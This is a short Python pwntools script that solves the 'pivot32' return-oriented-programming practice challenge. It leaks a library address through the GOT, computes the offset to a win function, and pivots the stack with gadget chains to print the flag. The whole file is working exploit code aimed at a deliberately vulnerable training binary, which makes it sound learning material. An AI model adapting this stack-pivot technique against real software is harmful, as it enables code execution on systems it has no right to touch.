#!/usr/bin/python

from pwn import *

elf = ELF("./pivot32")
libp = ELF('./libpivot32.so')
r = process(elf.path)

rop0 = p32(0x080488c4)					#eax,DWORD PTR [eax]; ret;
rop1 = p32(0x080488c0)					#pop eax; ret;
rop2 = p32(0x08048571)					#pop ebx; ret
rop3 = p32(0x080488C7)					#add eax, ebx;
rop4 = p32(0x080486A3)					#call eax;
rop5 = p32(0x080488c2)					#xchg esp, eax;

foothold_plt = p32(elf.plt["foothold_function"])
foothold_got = p32(elf.got["foothold_function"])

foothold_sym = libp.symbols['foothold_function']
ret2win  = libp.symbols['ret2win']
offset = p32(int(ret2win - foothold_sym)) 		#0x1f7

 
r.recvuntil(':')
recv = r.recvuntil('\n')
addr = p32(int(recv, 16))

payload = foothold_plt + rop1
payload += foothold_got + rop0
payload += rop2
payload += offset
payload += rop3
payload += rop4


r.recvuntil('>') 
r.sendline(payload)

payload = "A"*44 + rop1 + addr + rop5

r.recvuntil("> ")
r.sendline(payload)
r.recv()
log.success("Flag: " + r.recv())
